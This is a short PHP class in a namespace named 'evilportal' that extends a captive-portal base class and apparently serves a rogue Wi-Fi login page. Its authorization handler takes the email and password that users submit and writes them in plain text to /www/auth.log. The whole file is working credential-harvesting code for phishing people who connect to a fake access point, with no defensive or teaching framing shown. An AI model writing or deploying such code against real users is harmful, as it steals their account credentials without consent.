<?php
namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // Check for other form data here
	$fh = fopen('/www/auth.log', 'a+');
	fwrite($fh, "Email:  " . $_POST['email'] . "\n");
	fwrite($fh, "Pass:  " . $_POST['password'] . "\n\n");
	fclose($fh);
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}